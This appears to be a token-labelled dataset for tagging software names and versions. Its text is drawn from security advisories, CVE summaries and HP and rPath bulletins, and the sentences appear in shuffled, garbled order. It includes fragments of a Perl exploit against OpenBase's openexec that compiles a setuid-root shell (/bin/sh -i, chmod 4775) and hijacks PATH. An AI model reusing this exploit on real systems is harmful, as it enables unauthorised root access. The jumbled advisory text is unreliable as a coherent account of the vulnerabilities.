write O
( O
fd O
, O
buf O
, O
sizeof O
( O
buf O
) O
) O
) O
< O
0 O
) O
{ O
printf O
( O
Error O
: O
write O
( O
) O
= O

All O
rights O
reserved O
. O

Description O
: O
While O
using O
the O
Linux O
drivers O
for O
the O
CM4040 O
as O
a O
reference O
for O
writing O
a O
cmx O
FreeBSD O
driver O
, O
Compass O
Security O
has O
discovered O
two O
buffer O
overflows O
in O
the O
Linux O
drivers O
. O

However O
, O
unprivileged O
users O
may O
cause O
large O
indirect O
writes O
via O
userland O
daemons O
such O
as O
those O
provided O
by O
pcsc-lite O
or O
openct O
. O

In O
the O
read O
( O
) O
handler O
, O
there O
is O
a O
similar O
problem O
with O
data O
originating O
in O
the O
device O
. O

One O
of O
them O
in O
the O
write O
( O
) O
and O
another O
one O
in O
the O
read O
( O
) O
handler O
. O

Not O
vulnerable O
: O
Linux O
2.4/2.6 O
cm4040 O
drivers O
by O
Omnikey O
: O
- O
cm4040 O
v1.0.0 O
FreeBSD O
cmx O
driver O
by O
Daniel O
Roethlisberger O
Not O
tested O
: O
Other O
Linux O
driver O
versions O
Drivers O
for O
MacOS O
X O
, O
Windows O
Technical O

Therefore O
, O
one O
might O
think O
this O
is O
not O
an O
issue O
. O

PoC O
Code O
: O
Linux O
Omnikey O
Cardman O
4040 O
driver O
buffer O
overflow O
( O
CVE-2007-0005 O
) O
Copyright O
( O
C O
) O
Daniel O
Roethlisberger O
< O
daniel.roethlisberger O
( O
at O
) O
csnc O
( O
dot O
) O
ch O
[ O
email O
concealed O
] O
Compass O
Security O
Network O
Computing O
AG O
, O
Rapperswil O
, O
Switzerland O
. O

Buffer O
Overflow O
in O
Linux O
Drivers O
for O
Omnikey O
CardMan O
4040 O
( O
CVE-2007-0005 O
) O

Copyright O
2007 O
rPath O
, O
Inc O
. O

More O
recent O
PAE O
Xen O
kernels O
will O
be O
made O
available O
in O
order O
to O
take O
advantage O
of O
newer O
hardware O
support O
, O
and O
to O
more O
closely O
track O
upstream O
sources O
. O

Those O
kernels O
will O
be O
based O
on O
Xen O
3.0.3 O
, O
due O
to O
XenSource O
removing O
support O
for O
non-PAE O
kernels O
from O
all O
newer O
versions O
of O
Xen O
. O

Description O
: O
Many O
security O
updates O
have O
been O
applied O
to O
the O
Xen O
kernels O
included O
in O
rPath O
Linux O
. O

Additionally O
, O
missing O
header O
files O
have O
been O
added O
to O
enable O
building O
other O
packages O
against O
Xen O
header O
files O
. O

rPath O
Security O
Advisory O
: O
2007-0124-1 O
Published O
: O
2007-06-14 O
Products O
: O
rPath O
Linux O
1 O
Rating O
: O
Major O
Exposure O
Level O
Classification O
: O
Remote O
Deterministic O
Denial O
of O
Service O
Updated O
Versions O
: O
kernel=/conary.rpath.com O
@ O
rpl O
: O
devel O
1-xen/2.6.16.33-0.1-1 O
xen=/conary.rpath.com O
@ O
rpl O
: O
devel O
1/3.0.3_0-1.5-1 O
References O
: O

In O
the O
future O
, O
the O
2.6.16.x O
Xen O
kernels O
will O
be O
maintained O
only O
with O
important O
security O
fixes O
, O
and O
only O
for O
non-PAE O
x86 O
versions O
. O

These O
kernels O
will O
include O
more O
recent O
releases O
of O
Xen O
from O
XenSource O
. O

Most O
Xen O
systems O
do O
not O
expose O
these O
vulnerabilities O
, O
as O
many O
of O
the O
issues O
involve O
hardware O
support O
that O
is O
uncommon O
on O
Xen O
hosts O
and O
irrelevant O
on O
Xen O
guests O
. O

Several O
can O
not O
be O
exposed O
on O
default O
configurations O
of O
rPath O
Linux O
because O
tools O
to O
configure O
the O
subsystems O
are O
intentionally O
not O
included O
. O

rPSA-2007-0124-1 O
kernel O
xen O

Untrusted O
search O
path O
vulnerability O
in O
openexec O
in O
OpenBase SN
SQL SN
before SV
10.0.1 SV
allows O
local O
users O
to O
gain O
privileges O
via O
a O
modified O
PATH O
that O
references O
a O
malicious O
helper O
binary O
, O
as O
demonstrated O
by O
( O
1 O
) O
cp O
, O
( O
2 O
) O
rm O
, O
and O
( O
3 O
) O
killall O
, O
different O
vectors O
than O
CVE-2006-5327 O
. O

I O
don O
t O
feel O
like O
seeing O
which O
flags O
call O
which O
binaries O
... O
just O
3 O
is O
plenty O
to O
prove O
the O
point O
. O

-restart O
-MachLaunch O
-launch O
-noexit O
-install_plugins O
-kill O
-install O
-uninstall O
and O
-deactivate O
all O
may O
be O
used O
to O
trigger O
these O
issues O
. O

$ O
a O
- O
$ O
b O
; O
} O
print O
; O
exit O
1 O
; O
} O
$ O
ret O
= O
pack O
( O
l O
, O
( O
$ O
retval O
) O
) O
; O
( O
$ O
a O
, O
$ O
b O
) O
= O
split O
( O
: O
/ O
, O
$ O
tgts O
{ O
$ O
target O
} O
) O
; O
print O
Target O
: O
$ O
a O
- O
$ O
b O
; O
open O
( O
OP O
, O
> O
/tmp/finisterre.c O
) O
; O
printf O
OP O
main O
( O
) O
; O
printf O
OP O
{ O
seteuid O
( O
0 O
) O
; O
setegid O
( O
0 O
) O
; O
setuid O
( O
0 O
) O
; O
setgid O
( O
0 O
) O
; O
system O
( O
chown O
root O
: O
/tmp/pwns O
; O
chmod O
4775 O
/tmp/pwns O
open O
( O
OP O
, O
> O
/tmp/pwns.c O
) O
; O
printf O
OP O
main O
( O
) O
; O
printf O
OP O
{ O
seteuid O
( O
0 O
) O
; O
setegid O
( O
0 O
) O
; O
setuid O
( O
0 O
) O
; O
setgid O
( O
0 O
) O
; O
system O
( O
/bin/sh O
-i O
system O
( O
gcc O
-o O
/tmp/finisterre O
/tmp/finisterre.c O
) O
; O
system O
( O
gcc O
-o O
/tmp/pwns O
/tmp/pwns.c O
) O
; O
system O
( O
echo O
/bin/cp O
/tmp/finisterre O
/tmp/ O
$ O
a O
) O
; O
system O
( O
/bin/cp O
/tmp/finisterre O
/tmp/ O
$ O
a O
) O
; O
system O
( O
export O
PATH=/tmp O
: O
$ O
PATH O
; O
$ O
b O
) O
; O
system O
( O
/tmp/pwns O
) O
; O
milw0rm.com O
[ O

This O
is O
some O
fairly O
blatant O
and O
retarded O
use O
of O
system O
cd O
cp O
chmod O
chown O
rm O
mkdir O
and O
killall O
appear O
as O
strings O
in O
the O
binary O
hrmm O
can O
you O
cay O
system O
( O
) O
! O

$ O
tgts O
{ O
0 O
} O
= O
cp O
: O
$ O
binpath O
-install O
; O
$ O
tgts O
{ O
1 O
} O
= O
killall O
: O
$ O
binpath O
-kill O
; O
$ O
tgts O
{ O
2 O
} O
= O
rm O
: O
$ O
binpath O
-uninstall O
; O
unless O
( O
( O
$ O
target O
) O
= O
@ O
ARGV O
) O
{ O
print O
Usage O
: O
$ O
0 O
< O
target O
Targets O
: O
; O
foreach O
$ O
key O
( O
sort O
( O
keys O
% O
tgts O
a O
, O
$ O
b O
) O
= O
split O
( O
: O
/ O
, O
$ O
tgts O
{ O
$ O
key O
} O
) O
; O
print O
$ O
key O
. O

Tested O
against O
OpenBase10.0.0_MacOSX.dmg O
$ O
binpath O
= O
/Library/OpenBase/bin/openexec O
; O
Typical O
location O
. O

! O
/usr/bin/perl O
written O
by O
kf O
( O
kf_lists O
[ O
at O
] O
digitalmunition O
[ O
dot O
] O
com O
ftp O
: O
( O
vulnerable O
) O

Xcode SN
OpenBase SN
10.0.0 SV
( O
OSX O
) O
- O
Unsafe O
System O
Call O
Privilege O
Escalation O

Multiple O
buffer O
overflows O
in O
tunekrnl O
in O
IBM SN
Lotus SN
Domino SN
6.x SV
before SV
6.5.5 SV
FP2 SV
and SV
7.x SV
before SV
7.0.2 SV
allow O
local O
users O
to O
gain O
privileges O
and O
execute O
arbitrary O
code O
via O
unspecified O
vectors O
. O

EvalInSandbox O
in O
Mozilla SN
Firefox SN
and SN
Thunderbird SN
before SV
1.5.0.4 SV
allows O
remote O
attackers O
to O
gain O
privileges O
via O
javascript O
that O
calls O
the O
valueOf O
method O
on O
objects O
that O
were O
created O
outside O
of O
the O
sandbox O
. O

Description O
: O
Previous O
versions O
of O
the O
firefox O
browser O
and O
thunderbird O
mail O
user O
agent O
have O
multiple O
vulnerabilities O
, O
some O
of O
which O
allow O
remote O
servers O
to O
compromise O
user O
accounts O
. O

The O
firefox O
browser O
is O
the O
default O
browser O
on O
rPath O
Linux O
, O
and O
all O
users O
are O
strongly O
recommended O
to O
update O
firefox O
and O
thunderbird O
as O
soon O
as O
possible O
. O

rPath O
Security O
Advisory O
: O
2006-0091-1 O
Published O
: O
2006-06-02 O
Products O
: O
rPath O
Linux O
1 O
Rating O
: O
Major O
Exposure O
Level O
Classification O
: O
Local O
User O
Deterministic O
Vulnerability O
Updated O
Versions O
: O
firefox=/conary.rpath.com O
@ O
rpl O
: O
devel O
1/1.5.0.4-1-0.1 O
thunderbird=/conary.rpath.com O
@ O
rpl O
: O
devel O
1/1.5.0.4-1-0.1 O
References O
: O

rPSA-2006-0091-1 O
firefox O
thunderbird O

To O
review O
previously O
published O
Security O
Bulletins O
visit O
: O
The O
Software O
Product O
Category O
that O
this O
Security O
Bulletin O
relates O
to O
is O
represented O
by O
the O
5th O
and O
6th O
characters O
of O
the O
Bulletin O
number O
in O
the O
title O
: O
GN O
= O
HP O
General O
SW O
, O
MA O
= O
HP O
Management O
Agents O
, O
MI O
= O
Misc O
. O

HP O
does O
not O
warrant O
that O
this O
information O
is O
necessarily O
accurate O
or O
complete O
for O
all O
user O
situations O
and O
, O
consequently O
, O
HP O
will O
not O
be O
responsible O
for O
any O
damages O
resulting O
from O
user O
use O
or O
disregard O
of O
the O
information O
provided O
in O
this O
Bulletin O
. O

To O
update O
an O
existing O
subscription O
: O
Log O
in O
on O
the O
web O
page O
: O
Subscriber O
choice O
for O
Business O
: O
sign-in O
. O

On O
the O
web O
page O
: O
Subscriber O
Choice O
: O
your O
profile O
summary O
- O
use O
Edit O
Profile O
to O
update O
appropriate O
sections O
. O

HP O
is O
continually O
reviewing O
and O
enhancing O
the O
security O
features O
of O
software O
products O
to O
provide O
customers O
with O
current O
secure O
solutions O
. O

[ O
email O
concealed O
] O
It O
is O
strongly O
recommended O
that O
security O
related O
information O
being O
communicated O
to O
HP O
be O
encrypted O
using O
PGP O
, O
especially O
exploit O
information O
. O

To O
the O
extent O
permitted O
by O
law O
, O
neither O
HP O
nor O
its O
affiliates O
, O
subcontractors O
or O
suppliers O
will O
be O
liable O
for O
incidental O
, O
special O
or O
consequential O
damages O
including O
downtime O
cost O
; O
lost O
profits O
; O
damages O
relating O
to O
the O
procurement O
of O
substitute O
products O
or O
services O
; O
or O
damages O
for O
loss O
of O
data O
, O
or O
software O
restoration O
. O

The O
information O
provided O
is O
provided O
as O
is O
without O
warranty O
of O
any O
kind O
. O

Hewlett-Packard O
Company O
and O
the O
names O
of O
Hewlett-Packard O
products O
referenced O
herein O
are O
trademarks O
of O
Hewlett-Packard O
Company O
in O
the O
United O
States O
and O
other O
countries O
. O

The O
preliminary O
versions O
are O
available O
for O
download O
from O
the O
following O
url O
: O
ftp O
: O
ftp.mozilla.org/pub/mozilla.org/firefox/releases/1.5.0.6/contrib O
For O
HP-UX O
B.11.23 O
( O
IA O
) O
: O
firefox_1.5.0.6_ia.depot.gz O
firefox_1.5.0.6_ia.depot.gz.readme O
For O
HP-UX O
B.11.11 O
and O
B.11.23 O
( O
PA O
) O
: O
firefox_1.5.0.6_pa.depot.gz O
firefox_1.5.0.6_pa.depot.gz.readme O
This O
security O
bulletin O
will O
be O
revised O
when O
fully O
tested O
and O
localized O
versions O
of O
Firefox O
1.5.0.6 O
or O
subsequent O
for O
HP-UX O
are O
available O
. O

Other O
product O
and O
company O
names O
mentioned O
herein O
may O
be O
trademarks O
of O
their O
respective O
owners O
. O

Report O
: O
To O
report O
a O
potential O
security O
vulnerability O
with O
any O
HP O
supported O
product O
, O
send O
Email O
to O
: O
security-alert O
( O
at O
) O
hp O
( O
dot O
) O
com O
. O

HP O
recommends O
that O
all O
users O
determine O
the O
applicability O
of O
this O
information O
to O
their O
individual O
situations O
and O
take O
appropriate O
action O
. O

HP O
is O
broadly O
distributing O
this O
Security O
Bulletin O
in O
order O
to O
bring O
to O
the O
attention O
of O
users O
of O
the O
affected O
HP O
products O
the O
important O
security O
information O
contained O
in O
this O
Bulletin O
. O

These O
preliminary O
versions O
have O
received O
minimal O
testing O
and O
are O
localized O
for O
English O
only O
. O

BACKGROUND O
For O
further O
information O
please O
refer O
to O
: O
AFFECTED O
VERSIONS O
HP-UX O
B.11.11 O
HP-UX O
B.11.23 O
Firefox.FFOX-COM O
action O
: O
install O
preliminary O
version O
of O
Firefox O
1.5.0.6 O
available O
from O
mozilla.org O
END O
AFFECTED O
VERSIONS O
RESOLUTION O
HP O
has O
made O
preliminary O
versions O
of O
Firefox O
1.5.0.6 O
available O
to O
resolve O
the O
issue O
. O

The O
information O
in O
this O
document O
is O
subject O
to O
change O
without O
notice O
. O

For O
more O
information O
: O
r=B6834AA O
HISTORY O
Version:1 O
( O
rev.1 O
) O
- O
20 O
September O
2006 O
Initial O
release O
Support O
: O
For O
further O
information O
, O
contact O
normal O
HP O
Services O
support O
channel O
. O

These O
vulnerabilities O
could O
be O
exploited O
remotely O
resulting O
in O
unauthorized O
access O
, O
elevation O
of O
privileges O
, O
or O
Denial O
of O
Service O
( O
DoS O
) O
. O

Release O
Date O
: O
2006-09-20 O
Last O
Updated O
: O
2006-09-20 O
Potential O
Security O
Impact O
: O
Remote O
unauthorized O
access O
, O
elevation O
of O
privileges O
, O
Denial O
of O
Service O
( O
DoS O
) O
Source O
: O
Hewlett-Packard O
Company O
, O
HP O
Software O
Security O
Response O
Team O
VULNERABILITY O
SUMMARY O
Potential O
security O
vulnerabilities O
have O
been O
identified O
in O
Firefox O
running O
on O
HP-UX O
. O

BEGIN O
PGP O
SIGNED O
MESSAGE O
Hash O
: O
SHA1 O
SUPPORT O
COMMUNICATION O
- O
SECURITY O
BULLETIN O
Document O
ID O
: O
c00771742 O
Version O
: O
1 O
HPSBUX02153 O
SSRT061181 O
rev.1 O
- O
HP-UX O
Running O
Firefox O
, O
Remote O
Unauthorized O
Access O
or O
Elevation O
of O
Privileges O
or O
Denial O
of O
Service O
( O
DoS O
) O
NOTICE O
: O
The O
information O
in O
this O
Security O
Bulletin O
should O
be O
acted O
upon O
as O
soon O
as O
possible O
. O

SUPPORTED O
SOFTWARE O
VERSIONS O
: O
ONLY O
impacted O
versions O
are O
listed O
. O

To O
get O
the O
security-alert O
PGP O
key O
, O
please O
send O
an O
e-mail O
message O
as O
follows O
: O
To O
: O
security-alert O
( O
at O
) O
hp O
( O
dot O
) O
com O
[ O
email O
concealed O
] O

Under O
Step2 O
: O
your O
ITRC O
operating O
systems O
- O
verify O
your O
operating O
system O
selections O
are O
checked O
and O
save O
. O

( O
c O
) O
Copyright O
2006 O
Hewlett-Packard O
Development O
Company O
, O
L.P. O
Hewlett-Packard O
Company O
shall O
not O
be O
liable O
for O
technical O
or O
editorial O
errors O
or O
omissions O
contained O
herein O
. O

BEGIN O
PGP O
SIGNATURE O
Version O
: O
PGP O
8.1 O
iQA/AwUBRRJ0XuAfOvwtKn1ZEQIe5gCg7bs2DWdvIJEKn5Y1Uwk8R0A/wvAAnR35 O
08qbEDopyVaRjkt0U/IVMnLA O
=jvLV O
END O
PGP O
SIGNATURE O

References O
: O
Mozilla O
Foundation O
Security O
Advisory O
( O
MFSA O
) O
2006-56 O
, O
2006-55 O
, O
2006-54 O
, O
2006-53 O
, O
2006-52 O
, O
2006-51 O
, O
2006-50 O
, O
2006-48 O
, O
2006-47 O
, O
2006-46 O
, O
2006-45 O
, O
2006-44 O
, O
2006-43 O
, O
2006-42 O
, O
2006-41 O
, O
2006-39 O
, O
2006-38 O
, O
2006-37 O
, O
2006-36 O
, O
2006-35 O
, O
2006-34 O
, O
2006-33 O
, O
2006-32 O
, O
2006-31 O
, O
2006-30 O
, O
2006-29 O
, O
2006-28 O
, O
2006-27 O
, O
2006-25 O
, O
2006-24 O
, O
2006-23 O
, O
2006-22 O
, O
2006-20 O
. O

MANUAL O
ACTION O
: O
Yes O
- O
Update O
install O
preliminary O
version O
of O
Firefox O
1.5.0.6 O
available O
from O
mozilla.org O
PRODUCT O
SPECIFIC O
INFORMATION O
HP-UX O
Security O
Patch O
Check O
: O
Security O
Patch O
Check O
revision O
B.02.00 O
analyzes O
all O
HP-issued O
Security O
Bulletins O
to O
provide O
a O
subset O
of O
recommended O
actions O
that O
potentially O
affect O
a O
specific O
HP-UX O
system O
. O

To O
the O
extent O
permitted O
by O
law O
, O
HP O
disclaims O
all O
warranties O
, O
either O
express O
or O
implied O
, O
including O
the O
warranties O
of O
merchantability O
and O
fitness O
for O
a O
particular O
purpose O
, O
title O
and O
non-infringement O
. O

Firefox SN
prior SV
to SV
version SV
1.5.0.6 SV
running O
on O
HP-UX O
B.11.11 O
and O
B.11.23 O
. O

3rd O
party O
SW O
, O
MP O
= O
HP O
MPE/iX O
, O
NS O
= O
HP O
NonStop O
Servers O
, O
OV O
= O
HP O
OpenVMS O
, O
PI O
= O
HP O
Printing O
& O
Imaging O
, O
ST O
= O
HP O
Storage O
SW O
, O
TL O
= O
HP O
Trusted O
Linux O
, O
TU O
= O
HP O
Tru64 O
UNIX O
, O
UX O
= O
HP-UX O
, O
VV O
= O
HP O
Virtual O
Vault O
System O
management O
and O
security O
procedures O
must O
be O
reviewed O
frequently O
to O
maintain O
system O
integrity O
. O

[ O
security O
bulletin O
] O
HPSBUX02153 O
SSRT061181 O
rev.1 O
- O
HP-UX O
Running O
Firefox O
, O
Remote O
Unauthorized O
Access O
or O
Elevation O
of O
Privileges O
or O
Denial O
of O
Service O
( O
DoS O
) O

BACKGROUND O
For O
further O
information O
please O
refer O
to O
: O
AFFECTED O
VERSIONS O
HP-UX O
B.11.11 O
HP-UX O
B.11.23 O
Tbird.TBIRD-COM O
action O
: O
install O
preliminary O
version O
of O
Thunderbird O
1.5.0.5 O
available O
from O
mozilla.org O
END O
AFFECTED O
VERSIONS O
RESOLUTION O
HP O
has O
made O
preliminary O
versions O
of O
Thunderbird O
1.5.0.5 O
available O
to O
resolve O
the O
issue O
. O

The O
preliminary O
versions O
are O
available O
for O
download O
from O
the O
following O
url O
: O
ftp O
: O
ftp.mozilla.org/pub/mozilla.org/thunderbird/releases/1.5.0.5/contr O
ib O
For O
HP-UX O
B.11.23 O
( O
IA O
) O
: O
thunderbird_1.5.0.5_ia.depot.gz O
thunderbird_1.5.0.5_ia.depot.gz.readme O
For O
HP-UX O
B.11.11 O
and O
B.11.23 O
( O
PA O
) O
: O
thunderbird_1.5.0.5_pa.depot.gz O
thunderbird_1.5.0.5_pa.depot.gz.readme O
This O
security O
bulletin O
will O
be O
revised O
when O
fully O
tested O
and O
localized O
versions O
of O
Thunderbird O
1.5.0.5 O
or O
subsequent O
for O
HP-UX O
are O
available O
. O

BEGIN O
PGP O
SIGNATURE O
Version O
: O
PGP O
8.1 O
iQA/AwUBRRJ1suAfOvwtKn1ZEQJldwCgvL+AbyIO5AgnlFzJJ5ctJDvkndkAnRLI O
GVBDoa2RRcABskcSDGcgxqwO O
=feaD O
END O
PGP O
SIGNATURE O

Release O
Date O
: O
2006-09-20 O
Last O
Updated O
: O
2006-09-20 O
Potential O
Security O
Impact O
: O
Remote O
unauthorized O
access O
, O
elevation O
of O
privileges O
, O
Denial O
of O
Service O
( O
DoS O
) O
Source O
: O
Hewlett-Packard O
Company O
, O
HP O
Software O
Security O
Response O
Team O
VULNERABILITY O
SUMMARY O
Potential O
security O
vulnerabilities O
have O
been O
identified O
in O
Thunderbird O
running O
on O
HP-UX O
. O

MANUAL O
ACTION O
: O
Yes O
- O
Update O
install O
preliminary O
version O
of O
Thunderbird O
1.5.0.5 O
available O
from O
mozilla.org O
PRODUCT O
SPECIFIC O
INFORMATION O
HP-UX O
Security O
Patch O
Check O
: O
Security O
Patch O
Check O
revision O
B.02.00 O
analyzes O
all O
HP-issued O
Security O
Bulletins O
to O
provide O
a O
subset O
of O
recommended O
actions O
that O
potentially O
affect O
a O
specific O
HP-UX O
system O
. O

BEGIN O
PGP O
SIGNED O
MESSAGE O
Hash O
: O
SHA1 O
SUPPORT O
COMMUNICATION O
- O
SECURITY O
BULLETIN O
Document O
ID O
: O
c00774579 O
Version O
: O
1 O
HPSBUX02156 O
SSRT061236 O
rev.1 O
- O
HP-UX O
Running O
Thunderbird O
, O
Remote O
Unauthorized O
Access O
or O
Elevation O
of O
Privileges O
or O
Denial O
of O
Service O
( O
DoS O
) O
NOTICE O
: O
The O
information O
in O
this O
Security O
Bulletin O
should O
be O
acted O
upon O
as O
soon O
as O
possible O
. O

References O
: O
Mozilla O
Foundation O
Security O
Advisory O
( O
MFSA O
) O
2006-55 O
, O
2006-54 O
, O
2006-53 O
, O
2006-52 O
, O
2006-51 O
, O
2006-50 O
, O
2006-49 O
, O
2006-48 O
, O
2006-47 O
, O
2006-46 O
, O
2006-44 O
, O
2006-42 O
, O
2006-40 O
, O
2006-38 O
, O
2006-37 O
, O
2006-35 O
, O
2006-33 O
, O
2006-32 O
, O
2006-31 O
, O
2006-28 O
, O
2006-27 O
, O
2006-26 O
, O
2006-25 O
, O
2006-24 O
, O
2006-22 O
, O
2006-21 O
, O
2006-20 O
, O
2006-08 O
, O
2006-07 O
, O
2006-06 O
, O
2006-05 O
, O
2006-04 O
, O
2006-02 O
, O
2006-01 O
. O

Thunderbird O
prior O
to O
version O
1.5.0.5 O
running O
on O
HP-UX O
B.11.11 O
and O
B.11.23 O
. O

[ O
security O
bulletin O
] O
HPSBUX02156 O
SSRT061236 O
rev.1 O
- O
HP-UX O
Running O
Thunderbird O
, O
Remote O
Unauthorized O
Access O
or O
Elevation O
of O
Privileges O
or O
Denial O
of O
Service O
( O
DoS O
) O

rsh O
utility O
in O
Sun SN
Grid SN
Engine SN
( O
SGE SN
) O
before SV
6.0u7_1 SV
allows O
local O
users O
to O
gain O
privileges O
and O
execute O
arbitrary O
code O
via O
unspecified O
vectors O
, O
possibly O
involving O
command O
line O
arguments O
. O

Multiple O
SQL O
injection O
vulnerabilities O
in O
enVivo O
! O
CMS O
allow O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
and O
gain O
privileges O
via O
the O
( O
1 O
) O
username O
or O
( O
2 O
) O
password O
parameters O
to O
admin_login.asp O
, O
or O
the O
( O
3 O
) O
searchstring O
and O
possibly O
( O
4 O
) O
ID O
parameters O
to O
default.asp O
. O

newsscript.pl O
for O
NewsScript O
allows O
remote O
attackers O
to O
gain O
privileges O
by O
setting O
the O
mode O
parameter O
to O
admin O
. O

Servers SN
Alive SN
4.1 SV
and SV
5.0 SV
, O
when O
running O
as O
a O
service O
, O
does O
not O
drop O
SYSTEM O
privileges O
before O
loading O
local O
manual O
under O
the O
help O
menu O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
. O

Unknown O
vulnerability O
in O
ecartis SN
0.x SV
before SV
0.129a+1.0.0-snap20020514-1.3 SV
and SV
1.x SV
before SV
1.0.0+cvs.20030911-8 SV
allows O
attackers O
in O
the O
same O
domain O
to O
gain O
administrator O
privileges O
and O
modify O
configuration O
. O

Multiple O
buffer O
overflows O
in O
xboing SN
before SV
2.4 SV
allow O
local O
users O
to O
gain O
privileges O
. O

Unknown O
vulnerability O
in O
fs_usage O
in O
Mac SN
OS SN
X SN
10.2.8 SV
and SV
10.3.2 SV
and O
Mac SN
OS SN
X SN
Server SV
10.2.8 SV
and SV
10.3.2 SV
allows O
local O
users O
to O
gain O
privileges O
via O
unknown O
attack O
vectors O
. O

SAP SN
R/3 SN
2.0B SV
to SV
4.6D SV
installs O
several O
clients O
with O
default O
users O
and O
passwords O
, O
which O
allows O
remote O
attackers O
to O
gain O
privileges O
via O
the O
( O
1 O
) O
SAP O
, O
( O
2 O
) O
SAPCPIC O
, O
( O
3 O
) O
DDIC O
, O
( O
4 O
) O
EARLYWATCH O
, O
or O
( O
5 O
) O
TMSADM O
accounts O
. O

Symantec SN
Ghost SN
7.0 SV
stores O
usernames O
and O
passwords O
in O
plaintext O
in O
the O
NGServer O
params O
registry O
key O
, O
which O
could O
allow O
an O
attacker O
to O
gain O
privileges O
. O

nsd O
on O
SGI SN
IRIX SN
before SV
6.5.11 SV
allows O
local O
users O
to O
overwrite O
arbitrary O
files O
and O
gain O
root O
privileges O
via O
a O
symlink O
attack O
on O
the O
nsd.dump O
file O
. O

index2.php O
in O
Mambo SN
Site SN
Server SN
3.0.0 SV
through SV
3.0.5 SV
allows O
remote O
attackers O
to O
gain O
Mambo O
administrator O
privileges O
by O
setting O
the O
PHPSESSID O
parameter O
and O
providing O
the O
appropriate O
administrator O
information O
in O
other O
parameters O
. O

Buffer O
overflows O
in O
Pileup SN
before SV
1.2 SV
allows O
local O
users O
to O
gain O
root O
privileges O
via O
( O
1 O
) O
long O
command O
line O
arguments O
, O
or O
( O
2 O
) O
a O
long O
callsign O
. O

Buffer O
overflow O
in O
SNMP O
proxy O
agent O
snmpd O
in O
Solaris O
8 O
may O
allow O
local O
users O
to O
gain O
root O
privileges O
by O
calling O
snmpd O
with O
a O
long O
program O
name O
. O

Buffer O
overflows O
in O
ascdc O
Afterstep O
while O
running O
setuid O
allows O
local O
users O
to O
gain O
root O
privileges O
via O
a O
long O
( O
1 O
) O
-d O
option O
, O
( O
2 O
) O
-m O
option O
, O
or O
( O
3 O
) O
-f O
option O
. O

Format O
string O
vulnerability O
in O
hfaxd O
in O
HylaFAX SN
before SV
4.1.b2_2 SV
allows O
local O
users O
to O
gain O
privileges O
via O
the O
-q O
command O
line O
argument O
. O

Multiple O
Users O
Control O
Panel O
in O
Mac SN
OS SN
9 SV
allows O
Normal O
users O
to O
gain O
Owner O
privileges O
by O
removing O
the O
Users O
& O
Groups O
Data O
File O
, O
which O
effectively O
removes O
the O
Owner O
password O
and O
allows O
the O
Normal O
user O
to O
log O
in O
as O
the O
Owner O
account O
without O
a O
password O
. O

Linux SN
cdwtools SN
093 SV
and SV
earlier SV
allows O
local O
users O
to O
gain O
root O
privileges O
via O
the O
/tmp O
directory O
. O

Vulnerability O
in O
SCO O
cu O
program O
in O
UnixWare SN
7.x SV
allows O
local O
users O
to O
gain O
privileges O
. O

HP-UX O
aserver O
program O
allows O
local O
users O
to O
gain O
privileges O
via O
a O
symlink O
attack O
. O

fte-console O
in O
the O
fte SN
package SN
before SV
0.46b-4.1 SV
does O
not O
drop O
root O
privileges O
, O
which O
allows O
local O
users O
to O
gain O
root O
access O
via O
the O
virtual O
console O
device O
. O

Vulnerability O
in O
Advanced O
File O
System O
Utility O
( O
advfs O
) O
in O
Digital SN
UNIX SN
4.0 SV
through SV
4.0d SV
allows O
local O
users O
to O
gain O
privileges O
. O

Insecure O
directory O
permissions O
in O
RPM O
distribution O
for O
PostgreSQL O
allows O
local O
users O
to O
gain O
privileges O
by O
reading O
a O
plaintext O
password O
file O
. O
